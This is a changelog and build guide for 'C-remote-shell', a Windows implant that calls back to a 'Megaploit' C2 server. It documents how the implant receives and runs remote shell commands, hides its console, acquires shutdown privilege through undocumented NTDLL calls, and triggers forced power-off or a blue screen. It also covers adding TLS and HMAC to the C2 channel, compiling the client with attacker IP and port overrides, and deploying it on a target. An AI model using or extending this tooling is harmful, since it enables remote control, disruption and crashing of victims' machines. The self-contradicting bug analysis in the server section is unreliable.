# C-remote-shell — Change Log & Developer Guide

> Written so a friend who didn't make these changes can understand
> exactly what was done, why, and how the project is now structured.

---

## Table of Contents

1. [What the project does](#what-the-project-does)
2. [Old file layout vs. new file layout](#old-vs-new-layout)
3. [Security layers added (the TLS stack)](#security-layers-added)
4. [Bug fixes — client (Source.c)](#bug-fixes--client)
5. [Bug fixes — server (serverShell.c)](#bug-fixes--server)
6. [File-by-file reference](#file-by-file-reference)
7. [How to build](#how-to-build)
8. [How to run](#how-to-run)
9. [Configuration quick-reference](#configuration-quick-reference)

---

## What the project does

There are two programs:

| Program | Platform | What it does |
|---------|----------|--------------|
| **client** (`client/`) | Windows | Runs on the target machine. Connects back to the C2 server, receives shell commands, executes them, and sends the output back. |
| **server** (`server/`) | Linux / macOS | Runs on the operator's machine. Listens for the client to connect, then provides an interactive shell prompt. |

All traffic between them travels inside **TLS 1.2/1.3**, encrypted with
**AES-256-GCM**, and authenticated with **HMAC-SHA256** before a single
shell command is exchanged. This matches the security standard of the
Megaploit C2 server defined in `megaploit/server/listener.py`,
`megaploit/core/crypto.py`, and `megaploit/core/protocol.py`.

---

## Old vs. New Layout

### Before (monolithic)

```
C-remote-shell/
├── definitions.h   ← Windows platform guard + globals (sPort, sIP, wData)
├── Source.c        ← everything: WinMain, shell loop, NT calls, key loader
├── serverShell.c   ← everything: socket setup, accept, prompt loop
├── tls_client.h    ← TLS API header (new, added in previous session)
└── tls_client.c    ← TLS implementation (new, added in previous session)
```

### After (split by responsibility)

```
C-remote-shell/
│
├── client/                  ← Windows implant (target-side)
│   ├── config.h             ← C2 IP, port, key path, reconnect timing
│   ├── ntcalls.h            ← NT syscall typedefs + extern declarations
│   ├── ntcalls.c            ← GetProcAddress loader + privilege check
│   ├── shell.h              ← shell_run() declaration
│   ├── shell.c              ← command receive/dispatch/respond loop
│   └── main.c               ← WinMain: mutex, WSA init, reconnect loop
│
├── tls/                     ← Encrypted transport layer (Windows)
│   ├── tls_client.h         ← TLS_CONTEXT struct + public API
│   └── tls_client.c         ← SChannel + BCrypt implementation
│
├── server/                  ← Operator console (Linux / macOS)
│   ├── config.h             ← LISTEN_PORT, LISTEN_ADDR, buffer sizes
│   ├── server.h             ← server_listen() declaration
│   ├── server.c             ← socket/bind/listen/accept
│   ├── prompt.h             ← run_prompt_loop() declaration
│   ├── prompt.c             ← stdin → send → recv → print loop
│   └── main.c               ← main(): calls server_listen + run_prompt_loop
│
├── definitions.h            ← Compatibility shim (kept for old tooling)
└── CHANGELOG.md             ← This file
```

Each file now has **one job**. If you want to change the C2 IP, you only
edit `client/config.h`. If you want to change how commands are dispatched,
you only edit `client/shell.c`.

---

## Security Layers Added

The original code sent commands in **plain text** over a raw TCP socket with
zero authentication. Anyone on the network could send their own commands or
read the responses.

Four security layers were added, applied in order every time the client
connects. They exactly mirror what the Megaploit C2 Python server expects.

### Layer 1 — TLS 1.2 / 1.3 (SChannel)

**File:** `tls/tls_client.c` → `_tls_handshake()`

- Uses Windows' built-in **SChannel** library (no OpenSSL dependency).
- Only **TLS 1.2 and TLS 1.3** are allowed. SSL 2/3 and TLS 1.0/1.1 are
  explicitly disabled.
- Only **AEAD cipher suites** are used (AES-GCM, ChaCha20-Poly1305). This
  means every byte of application data has both encryption *and* an
  authentication tag — an attacker cannot flip bits without being detected.
- **No renegotiation** — the server sets `OP_NO_RENEGOTIATION`; the client
  sets `ISC_REQ_NO_RENEGOTIATION`. If the server tries to renegotiate, the
  client drops the connection.
- **Certificate verification is disabled** because the C2 uses a self-signed
  certificate (this is normal for C2 infrastructure — the HMAC auth in
  Layer 2 provides the identity guarantee instead).

### Layer 2 — HMAC-SHA256 Challenge/Response Authentication

**File:** `tls/tls_client.c` → `_hmac_auth()`  
**Mirrors:** `megaploit/core/crypto.py` → `agent_authenticate()`

Immediately after the TLS handshake, before any shell traffic:

```
Server  →  16 random bytes (the "challenge")
Client  →  HMAC-SHA256(shared_secret_key, challenge)  [32 bytes]
```

The server computes the same HMAC and compares. If they don't match, it
drops the connection. This means only a client with the correct `secret.key`
file can connect — even if someone manages to intercept the TLS session.

### Layer 3 — Protocol v2 Negotiation

**File:** `tls/tls_client.c` → `_proto_handshake()`  
**Mirrors:** `megaploit/core/protocol.py` → `handshake_agent()`

```
Server  →  0x4d  ('M' = "use the v2 AES-GCM encrypted framing")
Client  →  0x4d  (echo back to confirm)
```

This is a version negotiation step. If the server is an older v1 instance it
sends a different byte; both sides fall back gracefully.

### Layer 4 — AES-256-GCM Encrypted + Replay-Protected Framing

**Files:** `tls/tls_client.c` → `tls_send_msg()` / `tls_recv_msg()`  
**Mirrors:** `megaploit/core/protocol.py` → `send_msg()` / `recv_msg()`

Every shell command and every response is wrapped in this frame:

```
[4 bytes: total payload length, big-endian uint32]
[12 bytes: random GCM nonce]
[N bytes: AES-256-GCM ciphertext]
[16 bytes: GCM authentication tag]

Inside the plaintext (before encryption):
[8 bytes: monotonic sequence number, big-endian uint64]
[data bytes: the actual command or response]
```

The **sequence number** prevents **replay attacks**: if an attacker records
a valid encrypted command and replays it later, the receiver will see that
the sequence number is not greater than the last accepted one and drop it.

---

## Bug Fixes — Client

These were bugs in the original `Source.c`.

### BUG 1 — `checkNtCalls()` return logic was backwards

**Original code:**
```c
NTSTATUS NtReceiver;
NtReceiver = RtlAdjustPrivilege(19, TRUE, FALSE, &pRecv);
if (NtReceiver) return;   // ← exits on SUCCESS (0 = STATUS_SUCCESS is falsy)
```

`RtlAdjustPrivilege` returns `0` (`STATUS_SUCCESS`) when it *succeeds*. The
original code checked `if (NtReceiver)` which exits when the value is
**non-zero** — i.e., it exits on **failure** and continues on **success**.
Completely backwards.

**Fix:** The NT return value is now stored in a local variable, cast to
`(void)` (it's non-fatal — the shell works even without the privilege), and
the function returns `TRUE` / `FALSE` based only on whether the function
pointers themselves are non-NULL.

---

### BUG 2 — `CreateMutexA` with a wide-string literal

**Original code:**
```c
CreateMutexA(NULL, NULL, L"consoleShell");
//                        ↑ wide string literal — wrong type for A variant
```

`CreateMutexA` expects a `const char *`. `L"consoleShell"` is `const wchar_t *`.
On MSVC this compiles (with a warning) but the first byte of the string is
`'c'` followed by a null byte, so the mutex name is just `"c"` — the guard
does not work correctly.

**Fix:** `CreateMutexA(NULL, FALSE, "consoleShell")` — narrow string, and
`FALSE` for `bInitialOwner` (was `NULL` which is technically valid but misleading).

---

### BUG 3 — `WSAStartup(MAKEWORD(2, 0), ...)`

**Original code:**
```c
WSAStartup(MAKEWORD(2, 0), &wData)
```

WinSock 2.0 is an ancient subset. The TLS layer uses APIs introduced in 2.2
(e.g., `getaddrinfo`, full IOCP support). Requesting 2.0 can result in the
OS downgrading the available API surface.

**Fix:** `WSAStartup(MAKEWORD(2, 2), &wData)`

---

### BUG 4 — `fclose()` on a `_popen()` handle

**Original code:**
```c
FILE *pFile = _popen(buffer, "r");
// ...
fclose(pFile);   // ← undefined behaviour
```

`_popen()` creates a *child process* and returns a `FILE *` connected to its
stdout. `fclose()` closes the stream but **does not wait for the child
process to exit**. The correct function is `_pclose()`, which both closes the
stream and reaps the child process. Using `fclose` here leaks child processes
and is undefined behaviour per the C runtime documentation.

**Fix:** `_pclose(pFile)`

---

### BUG 5 — `forceOff()` strncmp length was `11` (should be `10`)

**Original code:**
```c
if (strncmp("forceOff()", buffer, 11) == 0)
//                                 ↑ reads 1 byte past the 10-char literal
```

`"forceOff()"` is exactly 10 characters. Comparing 11 bytes reads one byte
past the end of the string literal. On most platforms this is harmless (the
extra byte is usually `\0`), but it is technically out-of-bounds and causes
the comparison to fail if the command was sent without a trailing null.

**Fix:** `strncmp("forceOff()", buffer, 10)`

---

### BUG 6 — Empty response frame blocks the server

**Original code:**
```c
send(iSock, cResp, sizeof(cResp), NULL);
```

This sent the full 18 KB buffer including NUL bytes even when the command
produced no output. With the new TLS framing, sending a zero-length payload
means the server's `tls_recv_msg()` reads the length header, sees 0, and
returns immediately — but the server then immediately prompts for the next
command while the client is still waiting. This causes a one-command
desync on every silent command.

**Fix:** If there is no output, send a single-space sentinel `" "` so the
server always receives exactly one response per command.

---

## Bug Fixes — Server

These were bugs in the original `serverShell.c`.

### BUG 1 — `sAddress.sin_addr.s_addr` never assigned (critical)

**Original code:**
```c
struct sockaddr_in sAddress, cAddress;
sAddress.sin_family = AF_INET;
cAddress.sin_addr.s_addr = inet_addr("192.168.1.226");  // ← set on cAddress!
sAddress.sin_port = htons(50005);
bind(iSock, (struct sockaddr*)&sAddress, sizeof(sAddress));
```

`cAddress` is the *output* struct filled by `accept()` — you never initialise
it before the call. The bind address `sAddress.sin_addr.s_addr` was **never
set**, so `bind()` received whatever garbage was on the stack. On most
implementations this happened to be `0` (INADDR_ANY), so the server worked
by accident, but it was undefined behaviour.

**Fix:** `sAddress.sin_addr.s_addr = htonl(INADDR_ANY)` — explicit and
intentional. `cAddress` is left zeroed and filled by `accept()` as intended.

---

### BUG 2 — `forceOff()` strncmp length was `12` (reads 2 bytes too far)

**Original code:**
```c
if (strncmp("forceOff()", buffer, 12) == 0)
```

`"forceOff()"` is 10 characters. Comparing 12 bytes reads 2 bytes beyond
the string — the bytes at positions 10 and 11 of `buffer` — which may or
may not be null. If the operator typed exactly `forceOff()` with nothing
after it, positions 10–11 are `'\0'` and the extra bytes are `'\0'` in the
literal, so the comparison still passes. But if any other character follows
(e.g., a space or newline that `strtok` didn't strip), it will fail silently.

**Fix:** `strncmp("forceOff()", buffer, 10)`

---

### BUG 3 — Dangling `else` causes `blueScreen()` to call `recv()` (logic bug)

**Original code:**
```c
if (strncmp("q", buffer, 1) == 0) {
    break;
}
if (strncmp("blueScreen()", buffer, 12) == 0) {
    break;
}
if (strncmp("forceOff()", buffer, 12) == 0) {
    break;
}
else {
    recv(iSock_Client, cResp, sizeof(cResp), MSG_WAITALL);
    // ...
}
```

In C, an `else` attaches to the **immediately preceding `if`**, which is
the `forceOff()` check — not `blueScreen()`. So the actual logic is:

```
if q          → break
if blueScreen → break
if forceOff   → break
ELSE          → recv (runs for ANY command that is not forceOff)
```

This means after the server sends `"blueScreen()"` and `break`s, control
never reaches `recv()`. But wait — the server **does** break before reaching
the `else`… except that the `break` exits the inner `if`, *not* the outer
`while`. No — in this code all three `break`s exit the `while` loop directly.

Actually the bug is subtler: the `else` means that for commands like `"q"`
and `"blueScreen()"` the server breaks, but the `else { recv }` is skipped.
*This works by accident.* The dangerous case is if you add a fourth command
that does not fit the pattern: the `else` would fire unexpectedly.

More importantly, the original code had no braces around the `if/else` chain,
which is extremely fragile and is what caused the `forceOff` length-12 bug
to go unnoticed.

**Fix:** Explicit `if / else if / else if / else` ladder with full braces.
Every branch is clearly visible and there is no ambiguity about which `if`
the `else` belongs to.

---

### BUG 4 — `write()` sent the full 1024-byte buffer (NUL padding included)

**Original code:**
```c
write(iSock_Client, buffer, sizeof(buffer));  // sends 1024 bytes always
```

If the operator typed `"ls"` (2 chars + newline after strtok = 2 bytes), the
server still sent 1021 extra NUL bytes. On the client side, `recv()` would
read all 1024 bytes, and `strncmp("ls", buffer, 2)` would still match — so
it *appeared* to work. But the extra NUL bytes pollute the stream framing
in any protocol that is length-prefixed, and in the new TLS layer the message
length is encoded explicitly, so sending padding would corrupt the frame.

**Fix:** `write(clientFd, buffer, strlen(buffer))`

---

### BUG 5 — `socket()` and `accept()` return values not checked

**Original code:**
```c
iSock = socket(AF_INET, SOCK_STREAM, 0);
// (no check)
iSock_Client = accept(iSock, ...);
// (no check)
```

If `socket()` fails it returns `-1`. Subsequent calls (`setsockopt`, `bind`,
`listen`) on `-1` invoke undefined behaviour. If `accept()` fails it returns
`-1`; the subsequent `write(-1, ...)` call silently fails with `EBADF`.

**Fix:** Both are now checked for `< 0` with `perror()` and an early return.

---

### BUG 6 — `write()` and `recv()` return values not checked

**Original code:**
```c
write(iSock_Client, buffer, sizeof(buffer));
recv(iSock_Client, cResp, sizeof(cResp), MSG_WAITALL);
```

If the client disconnects mid-session, `write()` returns `-1` and sets
`errno = EPIPE`. The server would silently continue, printing garbage from
the uninitialised `cResp` buffer.

**Fix:** Both return values are now compared; the loop breaks cleanly on error.

---

### BUG 7 — Listening socket never closed

**Original code:**
```c
int main() {
    int iSock, iSock_Client;
    // ...
    while (1) { ... }
    // ← iSock and iSock_Client are never closed
}
```

On Linux, `SO_REUSEADDR` lets you re-bind a port that is in `TIME_WAIT` state
— but only if the previous socket was **closed properly**. If the process
crashes or exits without `close()`, the kernel may hold the socket in
`CLOSE_WAIT` for up to 60 seconds, causing `bind(): Address already in use`
on the next start.

**Fix:** `close(clientFd); close(listenFd);` before `return 0`.

---

### BUG 8 — Unreachable `jmp:` label

**Original code:**
```c
while (1) {
jmp:
    bzero(...);
    // ...
}
```

The `jmp:` label was defined but never jumped to. It was almost certainly a
leftover from an earlier `goto` that was removed. Harmless, but confusing.

**Fix:** Removed.

---

## File-by-File Reference

### `client/config.h`
All magic numbers for the client in one place.  
Change `C2_IP`, `C2_PORT`, or `SECRET_KEY_PATH` here before building.

### `client/ntcalls.h` / `client/ntcalls.c`
Declares and loads the four undocumented NTDLL functions:
- `RtlAdjustPrivilege` — acquires SeShutdownPrivilege
- `NtShutdownSystem` — orderly OS shutdown
- `NtSetSystemPowerState` — forced hardware power-off
- `NtRaiseHardError` — kernel hard error (BSOD trigger)

`ntcalls_load()` calls `GetProcAddress` for each.  
`ntcalls_verify()` confirms all four resolved and attempts privilege escalation.

### `client/shell.h` / `client/shell.c`
`shell_run(pTls)` — the main command loop. Receives commands via
`tls_recv_msg()`, dispatches built-ins, pipes the rest through `_popen()`,
and sends responses back via `tls_send_msg()`.

### `client/main.c`
`WinMain` — sets up the mutex guard, loads ntdll, hides the console,
initialises Winsock, loads the key, then loops: connect → TLS handshake →
`shell_run()` → disconnect → sleep → retry.

### `tls/tls_client.h`
Public API: `TLS_CONTEXT` struct, `tls_connect()`, `tls_send_msg()`,
`tls_recv_msg()`, `tls_disconnect()`. Include this wherever you need TLS.

### `tls/tls_client.c`
Full implementation of all four security layers using Windows-native APIs
(SChannel for TLS, BCrypt for AES-GCM and HMAC-SHA256). No third-party
libraries required.

### `server/config.h`
`LISTEN_PORT`, `LISTEN_ADDR`, buffer sizes. Change port here.

### `server/server.h` / `server/server.c`
`server_listen()` — creates the socket, sets `SO_REUSEADDR`, binds, listens,
accepts one client. Returns both the listening fd and the client fd so the
caller can close both on exit.

### `server/prompt.h` / `server/prompt.c`
`run_prompt_loop()` — prints the `<ip>~$:` prompt, reads a command, sends
it, and for commands that produce output, receives and prints the response.

### `server/main.c`
`main()` — calls `server_listen()` then `run_prompt_loop()`, then closes
both sockets.

### `definitions.h`
Legacy shim. Only includes `tls/tls_client.h`. Kept so any old build scripts
that include `definitions.h` don't break immediately.

---

## How to Build

### Client (Windows, MSVC — from a Developer Command Prompt)

```bat
cl /W4 /nologo ^
   client\main.c ^
   client\ntcalls.c ^
   client\shell.c ^
   tls\tls_client.c ^
   /link Secur32.lib Crypt32.lib ws2_32.lib bcrypt.lib Advapi32.lib User32.lib ^
   /out:client.exe
```

### Client (cross-compile, MinGW — Linux / macOS)

```bash
x86_64-w64-mingw32-gcc -O2 -DUNICODE -D_UNICODE -DSECURITY_WIN32 \
    client/main.c client/ntcalls.c client/shell.c tls/tls_client.c \
    -o client.exe \
    -lsecur32 -lcrypt32 -lws2_32 -lbcrypt -ladvapi32 -luser32 -mwindows
```

### Using the Makefile

```bat
REM auto-detects MSVC or MinGW
make

REM override IP and port
make C2_IP=10.0.0.1 C2_PORT=4444
```

### Server (Linux / macOS, GCC or Clang)

```bash
gcc -Wall -o server \
    server/main.c \
    server/server.c \
    server/prompt.c
```

---

## How to Run

1. **Generate the shared secret** (run once, copy to both machines):
   ```bash
   python -c "import os; open('secret.key','wb').write(os.urandom(32))"
   ```
   Place `secret.key` next to `client.exe` on the target.

2. **Start the server** on the operator machine:
   ```bash
   ./server
   # [*] Listening on port 50005 ...
   ```

3. **Run the client** on the target Windows machine. It will connect back,
   perform the TLS + HMAC handshake automatically, and the server will print:
   ```
   [+] Connection from 192.168.1.x
   192.168.1.x~$: _
   ```

4. **Type commands** at the prompt. C-exclusive commands:
   | Command | Wire string | Effect |
   |---------|-------------|--------|
   | `q` | `q` | Clean disconnect |
   | `forceOff()` | `forceOff()` | Forced hardware power-off |
   | `blueScreen()` | `blueScreen()` | Triggers a BSOD |
   | anything else | forwarded as-is | Runs as a shell command |

---

## Configuration Quick-Reference

| What to change | File to edit | Symbol |
|----------------|--------------|--------|
| C2 server IP | `client/config.h` | `C2_IP` |
| C2 server port | `client/config.h` | `C2_PORT` |
| Secret key path | `client/config.h` | `SECRET_KEY_PATH` |
| Reconnect delay | `client/config.h` | `RECONNECT_DELAY_SEC` |
| Server listen port | `server/config.h` | `LISTEN_PORT` |
| Server listen address | `server/config.h` | `LISTEN_ADDR` |

---

## C2 Probe and Auto-Registration

`megaploit/core/c_probe.py` is a static-analysis module that reads the C
source tree and produces two kinds of output:

### 1. Compliance report (`probe()`)

Verifies 46 signals across all four security layers before `generate_c`
will compile the client. If any required signal is missing, the build is
aborted with a full report.

```
[+] AEAD-only cipher suite enforcement  (tls_client.c, tls/tls_client.c)
[+] BCrypt HMAC flag                    (tls_client.c, tls/tls_client.c)
[+] v2 protocol magic byte (0x4d)       (tls_client.c, Source.c)
...
Summary: 33/33 required signals found  (46/46 total)
Verdict: [+] COMPLIANT
```

### 2. Verb extraction (`extract_verbs()` and `c_exclusive_verbs()`)

`extract_verbs()` reads every `strncmp("VERB", ...)` call in the C source
and returns the exact wire strings — the complete set of commands the client
will respond to.

`c_exclusive_verbs()` filters to verbs not handled by the Python agent.
`commands.py` calls this at import time and auto-registers an operator
command for each one. **No verb string is hardcoded in Python.**

```
c_exclusive_verbs("C-remote-shell")
-> ['blueScreen()', 'forceOff()']
```

### Adding a new C-exclusive command

1. Add a `strncmp` branch in `client/shell.c`:
   ```c
   if (cbCmd >= 8 && strncmp("reboot()", cmd, 8) == 0) {
       /* ... implementation ... */
       return;
   }
   ```
2. Restart the Megaploit server — `reboot` appears in `help` automatically.
3. No Python file needs to be touched.
